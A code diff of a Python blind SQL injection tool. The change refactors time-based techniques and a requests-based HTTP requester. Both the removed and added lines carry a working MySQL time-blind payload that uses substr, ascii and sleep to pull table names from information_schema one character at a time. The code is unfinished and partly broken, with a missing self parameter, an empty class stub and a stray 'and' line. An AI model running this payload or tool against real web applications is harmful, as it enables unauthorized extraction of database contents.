@@ -137,26 +137,6 @@ class query(object):
         return query(self.q_string,self.options)
 
 
-class requester(object):
-    '''
-    Requester objects are what make actual requests (http or otherwise). The point is
-    to abstract away all of the details of how a request is made, so that the technique
-    doesn't need to know whether the values it comes up with will be going into an http
-    request or a JSON query. This class is just a prototype and the __init__ function and
-    make_request function must be overridden. All setup should take place in the __init__ 
-    method and the make_request method should only take one parameter. The make_request method
-    takes a value as a parameter. This is the value that is to be tested or injected or whatever.
-    The __init__ method should contain enough logic such that this is possible. It would be 
-    easier to have the make_request method take more optional parameters, but it would decrease
-    the portability of requests and techniques
-    '''
-    def __init__(self):
-        raise NotImplemented
-    
-    def make_request(self,value):
-        raise NotImplemented
-
-
 class technique(object):
     '''
     This is a sql injection teqnique. Eg. Union based or Time based. Techniques need
@@ -166,7 +146,8 @@ class technique(object):
     option specifies the function to call to make an actual request. 
     '''
     @debug.func
-    def __init__(self,make_request_func): 
+    def __init__(self,make_request_func,query): 
+        self.query = query
         self.make_request_func = make_request_func
         if type(self) == technique:
             raise NotImplemented
@@ -280,24 +261,26 @@ class time_blind_technique(blind_technique):
     
     @debug.func
     def _is_greater(self,row_index,char_index,char_val,user_query):
-        query = self.query_greater.copy()
+        query = self.query.copy()
         query.set_option('user_query',user_query)
         query.set_option('row_index',str(row_index))
         query.set_option('char_index',str(char_index))
         query.set_option('char_val',str(ord(char_val)))
         query.set_option('sleep',str(self.sleep))
+        query.set_option('sign','>')
         query_string = query.render()
         res = self.make_request_func(query_string)
         return not res.time_eq(self.base_response)
 
     @debug.func
     def _is_equal(self,row_index,char_index,char_val,user_query):
-        query = self.query_equal.copy()
+        query = self.query.copy()
         query.set_option('user_query',user_query)
         query.set_option('row_index',str(row_index))
         query.set_option('char_index',str(char_index))
         query.set_option('char_val',str(ord(char_val)))
         query.set_option('sleep',str(self.sleep))
+        query.set_option('sign','=')
         query_string = query.render()
         res = self.make_request_func(query_string)
         return not res.time_eq(self.base_response)
@@ -307,19 +290,8 @@ class time_blind_technique(blind_technique):
         self.base_response = self.make_request_func()
 
 
-class mysql_time_blind_technique(time_blind_technique):
-    '''
-    fully implemeted time based blind sqli technique.
-    '''
-    @debug.func
-    def __init__(make_request_func,sleep=2):
-        self.query_greater = query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))>${char_val:123},sleep(${sleep:2}),0)=0")
-        self.query_equal = query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))=${char_val:123},sleep(${sleep:2}),0)=0")
-        super(mysql_time_blind_technique,self).__init__(make_request_func,sleep=sleep)
-
-class get_http_requester_evented(requester):
-
-class get_http_requester(requester):
+from requests import Request
+class get_http_requester(Request):
     '''
     This object makes requests. You configure it upon instantiation and then
     call the make_request method with the modifications to be made to the base request.
@@ -333,47 +305,10 @@ class get_http_requester(requester):
         self,
         url,
         port=80,
-        uri="/",
-        uri_injection_points=[],
-        query_string={},
-        query_injection_points=[],
+        uri=query("/"),
+        query_string=query(""),
         headers={},
-        headers_injection_points=[],
-        data={},
-        data_injection_points=[]):
-        '''
-        url - url should include protocol and domain. eg. "https://example.com"
-        
-        port - port should be an integer. this defaults to port 80.
-        
-        uri - path to the resource. defaults to /. eg. "/mydir/myscript.php"
-        
-        uri_injection_points - parts of the URI to replace with the value passed to 
-        make_request. We will use str.replace() method, so be careful of repeating 
-        strings and such....
-
-        query - we are assuming that the query string will take on the normal
-        formal of http://example.com?key=value&key2=value2. To make 
-        the implementation of this simpler, this comes in as a dictionary.
-        this is less extensible than taking a string, but it makes my life
-        a bit easier... eg. {'key':'value','key2':'value2'}
-        
-        query_injection_points - parts of the query_string to replace with the 
-        value passed to make_request (dictionary key)
-        
-        headers - HTTP headers as a dictionary. to be on the safe side you could encode
-        this before passing it in.
-        Eg. {'User-Agent':'Mozilla/5.0','Custom-Header':'Custom Value'}
-        
-        headers_injection_points - parts of the headers to replace with the value passed 
-        to make_request (dictionary key)
-        
-        data - POST data as an array. Same issues and format as query_string. see above
-        we decide whether to GET or POST based on presence of data parameter.
-        
-        data_injection_points - parts of the data to replace with the value passed to 
-        make_request (dictionary key)
-        '''
+        data={}):
 
         self.url = url
         self.port = port
@@ -490,11 +425,9 @@ def end_line():
     This is for fancy output. It deletes the last character printed to the terminal and
     starts a new line...
     '''
-    and 
     if not QUIET:
         stdout.write("\x08 \n")
         stdout.flush()
 
 if __name__ == "__main__":
-    pass
-    
+    mysql_query = query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))${sign}${char_val:123},sleep(${sleep:2}),0)=0")
